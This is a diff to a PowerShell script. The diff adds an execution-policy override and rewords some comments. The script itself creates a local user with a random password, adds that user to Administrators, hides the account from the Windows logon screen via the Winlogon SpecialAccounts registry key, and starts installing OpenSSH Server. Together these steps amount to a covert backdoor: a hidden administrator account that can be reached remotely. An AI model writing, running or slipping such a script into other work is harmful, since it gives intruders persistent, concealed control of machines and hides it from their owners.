@@ -1,4 +1,12 @@
-# Generate random password
+# Check the current execution policy
+$CurrentPolicy = Get-ExecutionPolicy
+
+# If the execution policy is Restricted, change it to RemoteSigned
+if ($CurrentPolicy -eq "Restricted") {
+    Set-ExecutionPolicy RemoteSigned -Scope Process -Force
+}
+
+# Generate a random password
 function RandomPasswordGenerator {
     return -join ((97..122) | Get-Random -Count 10 | ForEach-Object {[char]$_})
 }
@@ -17,7 +25,7 @@ New-LocalUser $Username -Password (ConvertTo-SecureString $Password -AsPlainText
 # Add the new user to the Administrators group
 Add-LocalGroupMember -Group "Administrators" -Member $Username
 
-# Hide user from Windows logon screen
+# Hide the user from the Windows logon screen
 New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name $Username -Value 0 -PropertyType DWORD -Force
 
 # Install the OpenSSH Server
